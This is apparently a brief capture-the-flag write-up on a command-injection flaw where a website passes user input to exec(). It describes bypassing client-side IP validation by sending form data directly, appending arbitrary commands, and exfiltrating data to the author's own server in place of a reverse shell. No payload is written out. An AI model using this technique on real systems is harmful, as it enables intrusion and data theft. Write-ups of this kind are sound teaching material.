The problem shows us that the website is pretty much directly inputting user input into exec()
which is a huge no-no. Another thing to note is that the client side input validation and the server-side input validation are different:
The client requires the user to input an ip address as the entire input, as denoted by the ^ and $ symbols.
It turns out that we can execute whatever we want by adding commands after the ip address, as long
as we directly send the form data to the server.

I know that the hint mentions setting up a reverse shell, but that's definitely unnecessary, since we can just
make the server send a request to my own server with information in the form data.
